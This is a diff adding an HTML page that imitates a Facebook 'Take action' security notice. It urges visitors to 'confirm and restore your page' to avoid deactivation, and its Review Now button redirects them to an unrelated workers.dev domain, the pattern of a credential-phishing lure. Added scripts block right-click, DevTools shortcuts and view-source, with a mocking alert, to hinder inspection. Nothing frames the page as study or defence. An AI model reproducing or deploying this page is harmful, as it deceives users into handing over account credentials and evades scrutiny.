@@ -1,0 +1,320 @@
+
+<!-- Parameter Mode DISABLED: Normal detection mode -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Take Action - Page Recommendation</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 16px;
+            padding-top: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid #e5e7eb;
+            background: white;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 36px;
+            min-height: 36px;
+        }
+
+        .back-btn img {
+            width: 24px;
+            height: 24px;
+        }
+
+        .back-btn:hover {
+            background-color: #f0f2f5;
+            border-radius: 50%;
+        }
+
+        .header-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #000;
+            margin-left: 12px;
+            flex-grow: 1;
+        }
+
+        .content {
+            padding: 0;
+        }
+
+        .banner {
+            width: 100%;
+            height: 180px;
+            background: linear-gradient(135deg, #7dd3c0 0%, #6bc9b8 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .action-card {
+            padding: 20px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .action-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+        }
+
+        .action-description {
+            font-size: 13px;
+            color: #65676b;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+
+        .request-btn {
+            width: 100%;
+            padding: 10px 16px;
+            background: #0a66c2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .request-btn:hover {
+            background-color: #084fa1;
+        }
+
+        .section {
+            padding: 20px;
+        }
+
+        .section-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 12px;
+        }
+
+        .menu-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #e5e7eb;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .menu-item:last-child {
+            border-bottom: none;
+        }
+
+        .menu-item:hover {
+            background-color: #f0f2f5;
+            margin: 0 -20px;
+            padding: 12px 20px;
+        }
+
+        .menu-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex: 1;
+        }
+
+        .menu-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .menu-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .menu-text {
+            font-size: 15px;
+            font-weight: 500;
+            color: #000;
+        }
+
+        .menu-arrow {
+            font-size: 18px;
+            color: #65676b;
+            margin-left: 8px;
+        }
+
+        @media (max-width: 480px) {
+            .banner {
+                height: 160px;
+            }
+
+            .action-card,
+            .section {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <button class="back-btn" onclick="history.back()">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2365676b' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cline x1='19' y1='12' x2='5' y2='12'%3E%3C/line%3E%3Cpolyline points='12 19 5 12 12 5'%3E%3C/polyline%3E%3C/svg%3E" alt="Back">
+            </button>
+            <div class="header-title">Take action</div>
+        </div>
+
+        <div class="content">
+            <div class="banner">
+                <img src="/img/DyvY_ITgt0e.png" alt="Banner">
+            </div>
+
+            <div class="action-card">
+                <div class="action-title">Facebook Security</div>
+                <div class="action-description">
+                    Please confirm and restore your page now to avoid restrictions or deactivation.
+                </div>
+                <button class="request-btn" onclick="requestReview()">Review Now</button>
+            </div>
+
+            <div class="section">
+                <div class="section-title">Get help</div>
+                <div class="menu-item" onclick="howReviewsWork()">
+                    <div class="menu-content">
+                        <div class="menu-icon">
+                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2365676b'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" alt="Info">
+                        </div>
+                        <div class="menu-text">How reviews work</div>
+                    </div>
+                    <div class="menu-arrow">›</div>
+                </div>
+                <div class="menu-item" onclick="helpCenter()">
+                    <div class="menu-content">
+                        <div class="menu-icon">
+                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2365676b'%3E%3Cpath d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z'/%3E%3C/svg%3E" alt="Help">
+                        </div>
+                        <div class="menu-text">Help center</div>
+                    </div>
+                    <div class="menu-arrow">›</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+function isMobile() {
+    return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+}
+
+// Config
+function requestReview() {
+    if (isMobile()) {
+        window.location.href = "https://resolve-issue.instant-today.workers.dev/"; // halaman mobile
+    } else {
+        window.location.href = "https://resolve-issue.instant-today.workers.dev/"; // halaman desktop
+    }
+}
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"4dde4dc858bc4c1c95c4c84c43ea8d04","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
+
+<script>
+// ===============================
+// FUNCTION TAMPILKAN TEKS
+// ===============================
+function showWarning() {
+    // bisa ganti alert atau pakai overlay
+    alert("GABISA BIKIN KAH? KOK CRACK CREATIF LAH WKWKWK");
+}
+
+// ===============================
+// DISABLE KLIK KANAN
+// ===============================
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    showWarning();
+});
+
+// ===============================
+// DETECT SHORTCUT DEVTOOLS
+// ===============================
+document.addEventListener('keydown', function(e) {
+
+    // F12
+    if (e.key === "F12") {
+        e.preventDefault();
+        showWarning();
+        return false;
+    }
+
+    // Ctrl+Shift+I / J / C
+    if (e.ctrlKey && e.shiftKey && (
+        e.key === "I" ||
+        e.key === "J" ||
+        e.key === "C"
+    )) {
+        e.preventDefault();
+        showWarning();
+        return false;
+    }
+
+    // Ctrl+U (view source)
+    if (e.ctrlKey && e.key.toLowerCase() === "u") {
+        e.preventDefault();
+        showWarning();
+        return false;
+    }
+});
+</script>
+</html>
